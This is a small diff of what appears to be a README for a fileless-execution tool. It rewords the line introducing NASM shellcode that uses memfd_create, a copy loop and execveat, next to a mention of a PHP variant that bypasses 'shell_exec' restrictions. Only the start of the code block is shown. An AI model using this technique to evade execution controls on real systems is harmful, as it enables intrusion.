@@ -39,7 +39,7 @@ The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberci
 
 ---
 
-For the druggies among us, here is some NASM to keep you happy.
+For the addicts, here is the nasm of the shellcode (memfd_create, copy loop & execveat):
 ```nasm
 ; nasm -felf64 open.nasm && ld open.o &&  ./a.out
 ; 
